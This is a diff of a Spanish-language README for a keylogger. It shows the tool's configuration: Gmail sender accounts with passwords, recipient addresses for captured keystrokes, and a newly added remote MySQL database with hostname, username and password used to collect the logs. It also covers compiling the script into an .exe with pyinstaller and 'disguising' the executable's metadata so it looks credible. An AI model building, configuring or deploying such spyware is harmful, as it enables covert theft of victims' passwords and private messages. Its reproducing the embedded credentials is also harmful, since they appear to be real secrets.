@@ -6,6 +6,7 @@ Proceso de Opciones avanzada del keylogger.
 
 __NOTA:__ Si no sabe no toque.
 ````py
+
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
 # NOTA:| Solo Cambie éstas variables si sabe      |
@@ -26,32 +27,59 @@ def FilePath():
 
 # ************************************  FIN ZONA CUSTOM AVANZADA   *********************************
 
-####################################################################################################
+
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
-# Correo de envío [Primaria] 
-def emailP():                   # <<== Cambia éste correo
-    return "correo1@gmail.com" 
+
+# ************ Zona Gmail ************* 
+def emailP():# Correo de envío [Primaria]                    
+    return "correo1@gmail.com"  # <<== Cambia éste correo
 def passP():                    # <<== Contraseña del correo
     return "contra1"
-# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-def emailS():                   # <<== Cambia éste correo
-    return "correo2@gmail.com"
-def passS():                   # <<== Contraseña del correo 
-    return "pass2"
+def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
+    return "correo2@gmail.com"  # <<== Cambia éste correo
+def passS():                   
+    return "pass2"              # <<== Contraseña del correo 
 
-def timeSend(): # Tiempo de envío perzonalizado
-    return 120 #Minutos                 <= Escoja su tiempo en minutos
-
-#Correos que recibirán el registro de teclas.
-def ReceiveE():
+def ReceiveE():#Correos que recibirán el registro de teclas.
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
     return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
+# ************ Fin Zona Gmail ************* 
+
+# ************ Start Zone DATABASE ************* 
+def DB_HOST():
+    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
+def DB_USER():
+    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
+def DB_PASS():
+    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
+def DB_NAME():
+    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
+def DB_PORT(): 
+    return "3306"                                                   # Opcional en algunos casos
+
+# ************ Fin Zone DATABASE ************* 
+def GMailOrDataBase():
+    return 1    # 1 = DataBase 
+                # 0 = Gmail
+                # (en las proximas actualizaciones , ambas a la vez)
+
+def timeSend(): # Tiempo de envío perzonalizado
+    return 20 #Minutos                 <= Escoja su tiempo en minutos
+
+# ************ Zona MediaFire *************     
+# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
+#def MFUser():
+#    return "corroe@gmail.com"                   # Proximas actualizaciones...
+
+#def MFPass():
+#    return "contra"
+
+# ************ Zona MediaFire ************* 
+
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-
 ````
-
 
 # Proceso de conversión: `*.py a *.exe`
 Se utilizará `pyinstaller`
@@ -64,6 +92,13 @@ Se utilizará `pyinstaller`
 
     ![Imagen1](https://i.imgur.com/MQAiVnJ.png)
     ![Imagen2](https://i.imgur.com/mTBByRy.png)
+
+    ![Imagen1](https://i.imgur.com/wGTfC4T.png)
+    ![Imagen2](https://i.imgur.com/Txt3QFS.png)
+
+
+
+
 
     Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
 2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
